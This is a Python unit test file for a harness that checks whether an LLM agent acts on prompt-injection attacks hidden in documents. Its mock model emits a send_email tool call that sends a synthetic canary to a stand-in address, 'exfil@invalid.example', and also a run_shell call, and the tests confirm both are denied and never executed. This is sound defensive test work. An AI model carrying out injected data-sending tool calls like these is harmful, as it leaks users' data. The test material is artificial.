import json
import sys
import unittest
from pathlib import Path

WORKER_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(WORKER_ROOT))

from guardian_ai_assessment import llm_lab  # noqa: E402


class ScriptedModel:
    def __init__(self, outputs):
        self.outputs = iter(outputs)

    def complete(self, *, system, user, seed):
        self.last_request = (system, user, seed)
        return next(self.outputs), 80, 20


def output(action, arguments):
    return json.dumps({"action": action, "arguments": arguments})


class LocalLlmLabHarnessTests(unittest.TestCase):
    def test_corpus_is_balanced_across_english_and_spanish(self):
        self.assertEqual(len(llm_lab.CASES), 8)
        self.assertEqual(sum(case.label == "attack" for case in llm_lab.CASES), 4)
        self.assertEqual(sum(case.label == "benign" for case in llm_lab.CASES), 4)
        self.assertEqual(sum(case.language == "en" for case in llm_lab.CASES), 4)
        self.assertEqual(sum(case.language == "es" for case in llm_lab.CASES), 4)
        self.assertEqual(len({case.case_id for case in llm_lab.CASES}), 8)

    def test_forbidden_model_tool_action_is_denied_without_execution(self):
        model = ScriptedModel(
            [
                output(
                    "send_email",
                    {
                        "recipient": "exfil@invalid.example",
                        "document_id": llm_lab.CASES[0].document_id,
                        "body": llm_lab.CASES[0].synthetic_canary,
                    },
                ),
                *[
                    output("final", {"text": "Resumen del documento."})
                    for _ in range(7)
                ],
            ]
        )

        evidence = llm_lab.evaluate_cases(model)
        first = evidence["caseEvidence"][0]
        denied = first["toolTrace"][1]

        self.assertTrue(first["actionAttempted"])
        self.assertTrue(first["unauthorizedActionAttempted"])
        self.assertTrue(first["policyViolation"])
        self.assertFalse(first["modelToolCallExecuted"])
        self.assertEqual(denied["authorization"], "denied")
        self.assertFalse(denied["executed"])
        self.assertFalse(denied["stateChanged"])
        self.assertFalse(first["causalityVerified"])
        self.assertEqual(evidence["toolSummary"]["unauthorizedExecutions"], 0)

    def test_quoted_attack_text_is_not_mistaken_for_tool_execution(self):
        outputs = [
            output("final", {"text": case.instruction_like_text or "Documento revisado."})
            for case in llm_lab.CASES
        ]
        evidence = llm_lab.evaluate_cases(ScriptedModel(outputs))
        benign_quote = next(
            record
            for record in evidence["caseEvidence"]
            if record["caseId"] == "benign_quote_en"
        )

        self.assertTrue(benign_quote["instructionTextPropagated"])
        self.assertFalse(benign_quote["actionAttempted"])
        self.assertFalse(benign_quote["unauthorizedActionAttempted"])
        self.assertFalse(benign_quote["policyViolation"])
        self.assertFalse(benign_quote["modelToolCallExecuted"])

    def test_invalid_json_is_not_counted_as_an_action(self):
        outputs = ["not-json"] + [
            output("final", {"text": "Sin acción."}) for _ in range(7)
        ]
        evidence = llm_lab.evaluate_cases(ScriptedModel(outputs))
        first = evidence["caseEvidence"][0]

        self.assertEqual(first["responseParseStatus"], "invalid_json")
        self.assertIsNone(first["modelAction"])
        self.assertFalse(first["actionAttempted"])
        self.assertFalse(first["unauthorizedActionAttempted"])
        self.assertFalse(first["policyViolation"])

    def test_unknown_action_is_denied_at_the_tool_boundary(self):
        outputs = [
            output("run_shell", {"command": "echo synthetic"})
        ] + [
            output("final", {"text": "Sin acción."}) for _ in range(7)
        ]
        evidence = llm_lab.evaluate_cases(ScriptedModel(outputs))
        first = evidence["caseEvidence"][0]

        self.assertEqual(first["responseParseStatus"], "unknown_action")
        self.assertEqual(first["modelAction"], "unknown")
        self.assertTrue(first["actionAttempted"])
        self.assertTrue(first["unauthorizedActionAttempted"])
        self.assertEqual(first["toolTrace"][1]["tool"], "unknown")
        self.assertFalse(first["toolTrace"][1]["executed"])

    def test_evidence_contains_hashes_but_no_raw_documents_or_canaries(self):
        evidence = llm_lab.evaluate_cases(
            ScriptedModel(
                [
                    output("final", {"text": "Resumen breve."})
                    for _ in llm_lab.CASES
                ]
            )
        )
        serialized = json.dumps(evidence, ensure_ascii=False)

        self.assertNotIn("exfil@invalid.example", serialized)
        self.assertNotIn("GN-SYN-EN-4D21", serialized)
        self.assertNotIn(llm_lab.CASES[0].document, serialized)
        self.assertTrue(evidence["rawPromptsStored"] is False)
        self.assertTrue(evidence["rawResponsesStored"] is False)
        self.assertFalse(evidence["realLlmInference"])
        self.assertTrue(evidence["mockModelUsed"])
        self.assertEqual(len(evidence["caseCorpusSha256"]), 64)
        self.assertEqual(len(evidence["evidenceSha256"]), 64)
        self.assertTrue(evidence["selfChecks"]["deniedCallsHaveNoSideEffects"])

    def test_metrics_have_explicit_denominators_and_are_case_limited(self):
        outputs = [
            output("send_email", {"recipient": "lab@invalid.example"})
            if case.label == "attack"
            else output("final", {"text": "Correcto."})
            for case in llm_lab.CASES
        ]
        evidence = llm_lab.evaluate_cases(ScriptedModel(outputs))
        metrics = evidence["metrics"]

        self.assertEqual(metrics["sampleCount"], 8)
        self.assertEqual(metrics["positiveSupport"], 4)
        self.assertEqual(metrics["negativeSupport"], 4)
        self.assertEqual(metrics["truePositive"], 4)
        self.assertEqual(metrics["falsePositive"], 0)
        self.assertEqual(metrics["trueNegative"], 4)
        self.assertEqual(metrics["falseNegative"], 0)
        self.assertEqual(metrics["recall"]["denominator"], 4)
        self.assertIn("not a detector benchmark", metrics["interpretation"])


if __name__ == "__main__":
    unittest.main()
